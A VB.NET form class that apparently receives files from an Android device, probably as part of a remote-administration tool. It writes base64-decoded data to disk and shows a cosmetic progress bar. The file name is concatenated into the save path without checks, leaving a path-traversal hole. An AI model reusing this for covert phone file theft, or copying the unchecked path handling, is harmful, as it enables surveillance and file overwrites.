Public Class Android_FileDownloader
    Public sock As Integer
    '##################################################
    '################### CODED  #######################
    '##################### BY #########################
    '############### Saher Blue Eagle  ################
    '###############  XPR OPEN SOURCE  ################
    '##################################################
    '##################################################
    Private Sub Android_FileDownloader_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load

    End Sub
    Protected Friend Sub WriteBytes(ByVal filstring As String, ByVal filenamer As String, ByVal dwnfolder As String)
        Dim down_dir As String = dwnfolder
        Try
           

            System.IO.File.WriteAllBytes(down_dir & "\" & filenamer, Convert.FromBase64String(filstring))
            Try
                'progress
                Dim file_Str_len As Integer = filstring.Length - 1
                ProgressBar1.Maximum = file_Str_len
                For i As Integer = 0 To file_Str_len
                    Try:ProgressBar1.Value += 1:   Catch ex As Exception:End Try
                Next
            Catch ex As Exception

            End Try
            Label2.Text = "File Downloaded Successfully"
            Label3.Text = "Progress : Done"
            Button1.Enabled = True
        Catch ex As Exception
            MsgBox(ex.Message)
            Label2.Text = "Failed to download file "
        End Try


    End Sub

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        '
        If System.IO.Directory.Exists(Application.StartupPath & "\Mobile_Downloads\") Then
            Process.Start(Application.StartupPath & "\Mobile_Downloads\")
        End If
    End Sub
End Class